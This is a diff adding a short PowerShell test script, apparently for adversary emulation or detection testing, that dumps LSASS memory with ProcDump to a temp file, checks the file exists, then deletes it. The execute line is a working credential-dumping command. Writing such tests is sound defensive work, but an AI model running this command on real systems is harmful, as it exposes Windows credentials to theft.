@@ -1,0 +1,16 @@
+# Dump LSASS.exe memory using ProcDump
+# Download ProcDump from SysInternals here: https://download.sysinternals.com/files/Procdump.zip
+
+# Platform=windows
+# Execution=powershell
+# AdminRequired=yes
+# Invasive=yes, will seize processes
+
+# Execute 
+procdump64.exe -accepteula -ma lsass.exe C:\windows\temp\lsass_dump.dmp
+
+# Test
+if (test-path C:\windows\temp\lsass_dump.dmp) { exit 0 } else { exit 1 }
+
+# Cleanup
+Remove-Item C:\windows\temp\lsass_dump.dmp -ErrorAction Ignore
